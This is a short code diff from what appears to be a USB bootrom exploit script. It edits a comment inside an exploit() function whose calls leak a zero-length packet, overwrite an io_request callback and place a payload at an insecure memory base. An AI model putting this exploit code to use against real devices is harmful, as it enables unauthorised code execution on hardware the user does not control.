@@ -67,7 +67,7 @@ def exploit():
     # Send a packet that will leak a ZLP
     usb_req_leak(device)
 
-    # Overwrite the leaked io_request callback and next fields?
+    # Overwrite the leaked io_request callback and next fields (from the packet just sent?)
     libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 50)
 
     # Fill image buffer with payload at insecure memory base
